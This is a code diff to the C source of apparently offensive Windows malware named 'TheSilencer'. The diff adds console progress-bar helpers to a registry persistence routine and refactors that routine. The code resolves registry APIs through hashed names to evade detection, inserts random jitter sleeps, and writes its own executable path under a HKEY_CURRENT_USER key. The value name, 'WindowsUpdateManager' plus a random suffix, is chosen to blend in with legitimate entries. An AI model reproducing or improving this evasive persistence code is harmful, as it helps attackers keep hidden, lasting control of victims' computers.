@@ -2,6 +2,7 @@
 // API hashing, dynamic key generation, and entropy-based timing functions
 
 #include <Windows.h>
+#include <stdio.h>
 #include "Structs.h"
 #include "Common.h"
 #include "FunctionPntrs.h"
@@ -43,12 +44,37 @@ VOID XmGenerateSubKey(PWCHAR Buffer, SIZE_T Size) {
 }
 // -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+// Helper functions for UI presentation
+VOID XmPrintProgress(const WCHAR* status, int progress) {
+#ifdef DEBUG
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    PRINT("\r[");
+    for (int i = 0; i < 25; i++) {
+        if (i < progress / 4) {
+            PRINT("==");
+        }
+        else {
+            PRINT("  ");
+        }
+    }
+    PRINT("] %d%% | %ws", progress, status);
+    FlushFileBuffers(hConsole);  // Use Windows API instead of fflush
+#endif
+}
 
+VOID XmPrintHeader() {
+#ifdef DEBUG
+    PRINT("\n==========================================================\n");
+    PRINT("             TheSilencer Persistence Setup                  \n");
+    PRINT("==========================================================\n\n");
+#endif
+}
 
 // Function to set persistence in the registry
 BOOL XmSetPersistence(VOID) {
 #ifdef DEBUG
-    PRINT("[*] Starting persistence setup...\n");
+    XmPrintHeader();
+    XmPrintProgress(L"Initializing persistence setup...", 0);
 #endif
 
     WCHAR wszPath[MAX_PATH] = { 0 };
@@ -59,22 +85,19 @@ BOOL XmSetPersistence(VOID) {
     // Get current module path
     if (GetModuleFileNameW(NULL, wszPath, MAX_PATH) == 0) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get module path. Error: %d\n", GetLastError());
+        PRINT("\n[-] Failed to get module path. Error: %d\n", GetLastError());
 #endif
         return FALSE;
     }
 
-#ifdef DEBUG
-    PRINT("[*] Module path: %ws\n", wszPath);
-#endif
-
+    XmPrintProgress(L"Loading required modules...", 20);
     XmJitterSleep();
 
     // First load advapi32.dll using LoadLibraryA
     HMODULE hKernel32 = GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH);
     if (!hKernel32) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get kernel32.dll handle\n");
+        PRINT("\n[-] Failed to get kernel32.dll handle\n");
 #endif
         return FALSE;
     }
@@ -82,108 +105,72 @@ BOOL XmSetPersistence(VOID) {
     fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, DLL_LOAD_HASH);
     if (!pLoadLibraryA) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get LoadLibraryA\n");
+        PRINT("\n[-] Failed to get LoadLibraryA\n");
 #endif
         return FALSE;
     }
 
-    // Load advapi32.dll
+    XmPrintProgress(L"Loading advapi32.dll...", 40);
     pLoadLibraryA("advapi32.dll");
 
-    // Now get the handle to advapi32.dll
     HMODULE hAdvapi = GetModuleHandleH(advapi32dll_DJB2);
     if (!hAdvapi) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get advapi32.dll handle\n");
+        PRINT("\n[-] Failed to get advapi32.dll handle\n");
 #endif
         return FALSE;
     }
 
-#ifdef DEBUG
-    PRINT("[+] Successfully loaded advapi32.dll\n");
-#endif
+    XmPrintProgress(L"Resolving registry functions...", 60);
 
-    fnRegCreateKeyExW pRegCreateKeyExW = (fnRegCreateKeyExW)GetProcAddressH(
-        hAdvapi,
-        REG_CREATE_HASH
-    );
-
+    fnRegCreateKeyExW pRegCreateKeyExW = (fnRegCreateKeyExW)GetProcAddressH(hAdvapi, REG_CREATE_HASH);
     if (!pRegCreateKeyExW) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get RegCreateKeyExW\n");
+        PRINT("\n[-] Failed to get RegCreateKeyExW\n");
 #endif
         return FALSE;
     }
 
-    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(
-        hAdvapi,
-        REG_SET_VALUE_HASH
-    );
-
+    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(hAdvapi, REG_SET_VALUE_HASH);
     if (!pRegSetValueExW) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get RegSetValueExW\n");
+        PRINT("\n[-] Failed to get RegSetValueExW\n");
 #endif
         return FALSE;
     }
 
-    fnRegCloseKey pCloseKey = (fnRegCloseKey)GetProcAddressH(
-        hAdvapi,
-        REG_CLOSE_KEY_HASH
-    );
-
+    fnRegCloseKey pCloseKey = (fnRegCloseKey)GetProcAddressH(hAdvapi, REG_CLOSE_KEY_HASH);
     if (!pCloseKey) {
 #ifdef DEBUG
-        PRINT("[-] Failed to get RegCloseKey\n");
+        PRINT("\n[-] Failed to get RegCloseKey\n");
 #endif
         return FALSE;
     }
 
-#ifdef DEBUG
-    PRINT("[+] Registry functions resolved\n");
-#endif
+    XmPrintProgress(L"Setting up registry persistence...", 80);
 
-    // Generate single unique key path
     XmGenerateSubKey(wszKeyPath, MAX_PATH);
-
-#ifdef DEBUG
-    PRINT("[*] Generated registry key path: %ws\n", wszKeyPath);
-#endif
-
-    // Generate less obvious value name to blend with Windows Update related entries
+    
     WCHAR wszValueName[32] = { 0 };
     DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
-    wsprintfW(wszValueName, L"WindowsUpdateManager%x",
-        (entropy & 0xFFFF));
-
-#ifdef DEBUG
-    PRINT("[*] Creating registry key...\n");
-#endif
+    wsprintfW(wszValueName, L"WindowsUpdateManager%x", (entropy & 0xFFFF));
 
     DWORD dwError = 0;
     if (pRegCreateKeyExW(HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
         REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
 
         XmJitterSleep();
-
-#ifdef DEBUG
-        PRINT("[+] Key created successfully\n");
-        PRINT("[*] Setting registry value...\n");
-#endif
+        XmPrintProgress(L"Finalizing persistence...", 90);
 
         DWORD cbData = (DWORD)((wcslen(wszPath) + 1) * sizeof(WCHAR));
         if (pRegSetValueExW(hKey, wszValueName, 0, REG_SZ,
             (BYTE*)wszPath, cbData) == ERROR_SUCCESS) {
-
-#ifdef DEBUG
-            PRINT("[+] Value set successfully\n");
-#endif
             bSuccess = TRUE;
         }
         else {
             dwError = GetLastError();
 #ifdef DEBUG
-            PRINT("[-] Failed to set value. Error: %d\n", dwError);
+            PRINT("\n[-] Failed to set value. Error: %d\n", dwError);
 #endif
         }
 
@@ -195,8 +182,17 @@ BOOL XmSetPersistence(VOID) {
     else {
         dwError = GetLastError();
 #ifdef DEBUG
-        PRINT("[-] Failed to create key. Error: %d\n", dwError);
+        PRINT("\n[-] Failed to create key. Error: %d\n", dwError);
 #endif
+    }
+
+    if(bSuccess) {
+        XmPrintProgress(L"Persistence successfully established!", 100);
+        PRINT("\n\n");
+        
+        // Add longer jitter sleep after completion
+        DWORD finalEntropy = GetTickCount() ^ GetCurrentProcessId();
+        Sleep(2000 + (finalEntropy % 1000)); // Sleep between 2-3 seconds
     }
 
     // Cleanup sensitive data
